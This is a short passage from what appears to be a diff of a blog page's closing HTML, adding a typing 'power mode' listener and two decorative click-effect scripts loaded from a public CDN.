+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="❤,Y,G,K,I,N,G" data-fontsize="15px" data-random="true" async="async"></script></div></body></html>
